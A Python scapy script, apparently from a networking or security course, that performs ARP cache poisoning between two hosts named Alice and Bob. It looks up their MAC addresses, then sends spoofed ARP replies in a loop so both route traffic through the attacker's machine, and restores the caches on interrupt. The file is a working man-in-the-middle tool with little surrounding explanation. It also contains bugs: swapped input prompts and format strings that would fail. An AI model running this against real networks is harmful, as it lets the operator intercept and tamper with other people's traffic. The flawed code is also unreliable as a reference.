from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.l2 import ARP
import socket

def getMACaddressForIP(ip_addr):
    # Broadcasts an arp request asking for MAC address of machine with given ip_addr 
    arp_request = Ether(dst = 'ff:ff:ff:ff:ff:ff') / ARP(pdst = ip_addr)
    # receiving the arp response
    arp_response = srp(arp_request, timeout = 20, verbose = False)
    # extracting MAC address of the Machine whose IP address is specified
    mac_address = arp_response[0][0][1].hwsrc
    return mac_address

def poison(dst_ip, source_ip, dst_mac):
    # create spoofed ARP packets which contains source MAC Address of attacker (here Trudy) instead of 
    # the real MAC address of source IP mentioned in the ARP Packet
    poison_packet = ARP(op = 2, pdst = dst_ip, psrc = source_ip, hwdst = dst_mac)
    # sending packet to the target machine, setting verbose to False avoids printing extra logs on terminal.
    send(poison_packet, verbose = False)

def unpoison(dst_ip, dst_mac, source_ip, source_mac):
    # switch back to creating unpoisoned ARP packets with correct MAC entries 
    unpoison_packet = ARP(op = 2, pdst = dst_ip, psrc = source_ip, hwdst = dst_mac, hwsrc = source_mac)
    # sending packet to the target machine, setting verbose to False avoids printing extra logs on terminal.
    send(unpoison_packet, verbose = False)




alice = input('Enter Hostname of Bob: ')
bob = input('Enter Hostname of Alice: ')
alice_ip = socket.gethostbyname(alice)
bob_ip = socket.gethostbyname(bob)
alice_mac = getMACaddressForIP(alice_ip)
print('{alice} MAC address is {gateway_mac}'.format(alice,alice_mac))
bob_mac = getMACaddressForIP(bob_ip)
print('{bob} MAC address is {target_mac}'.format(bob,bob_mac))

input('starting ARP cache poisoning...')

try:
    while True:
        poison(alice_ip, bob_ip, alice_mac)
        poison(bob_ip, alice_ip, bob_mac)

except KeyboardInterrupt:
    unpoison(alice_ip, alice_mac, bob_ip, bob_mac)
    unpoison(bob_ip, bob_mac, alice_ip, alice_mac)
    exit()
